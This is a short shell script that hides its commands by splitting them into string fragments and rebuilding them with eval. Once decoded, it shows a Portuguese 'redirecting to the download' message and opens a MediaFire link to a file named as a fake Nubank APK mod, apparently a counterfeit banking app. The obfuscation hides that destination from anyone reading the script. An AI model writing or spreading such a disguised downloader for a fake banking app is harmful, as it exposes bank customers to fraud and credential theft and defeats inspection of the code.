
z="
";Ez='reci';cz='/Nub';Xz='file';Kz='ad..';Oz='xdg-';Fz='onan';az='3mgj';Jz='wnlo';Nz='cat';Mz=' lol';fz='+APK';Sz='//ww';Zz='kh15';dz='ank+';Dz=' "Di';ez='Fake';Rz='tps:';Gz='do p';Bz='r';Iz='o do';hz='d"';bz='qn99';Yz='/eh7';gz='+.mo';Wz='com/';Az='clea';Tz='w.me';Uz='diaf';Vz='ire.';Cz='echo';Hz='ara ';Lz='." |';Pz='open';Qz=' "ht';
eval "$Az$Bz$z$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$z$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Xz$Yz$Zz$az$bz$cz$dz$ez$fz$gz$hz"